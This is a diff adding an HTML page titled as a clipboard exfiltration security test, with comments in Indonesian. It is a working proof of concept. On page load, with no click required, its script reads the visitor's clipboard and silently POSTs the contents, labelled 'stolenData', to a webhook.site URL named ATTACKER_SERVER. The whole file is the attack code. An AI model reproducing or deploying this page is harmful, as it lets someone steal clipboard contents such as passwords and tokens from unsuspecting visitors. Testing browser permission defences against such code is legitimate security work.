@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h3>Security Analysis: Clipboard Exfiltration Test</h3>
+    <p>Status: <span id="status">Testing...</span></p>
+    <div id="hasil"></div>
+
+    <script>
+        // Gunakan Webhook.site untuk melihat data yang dikirimkan secara real-time
+        const ATTACKER_SERVER = "https://webhook.site/8020a520-ac20-474c-bb29-35cf02751528";
+
+        async function exfiltrateClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                
+                // Menampilkan di layar (hanya untuk verifikasi)
+                document.getElementById('hasil').innerText = "Data terbaca: " + text;
+                document.getElementById('status').innerText = "Data Terdeteksi!";
+
+                // Mengirim data ke server penyerang secara otomatis (Eksfiltrasi)
+                await fetch(ATTACKER_SERVER, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ stolenData: text, timestamp: new Date() })
+                });
+
+            } catch (err) {
+                document.getElementById('status').innerText = "Akses ditolak atau clipboard kosong.";
+            }
+        }
+
+        // Skrip berjalan otomatis saat halaman dimuat (Tanpa tombol)
+        window.onload = exfiltrateClipboard;
+    </script>
+</body>
+</html>
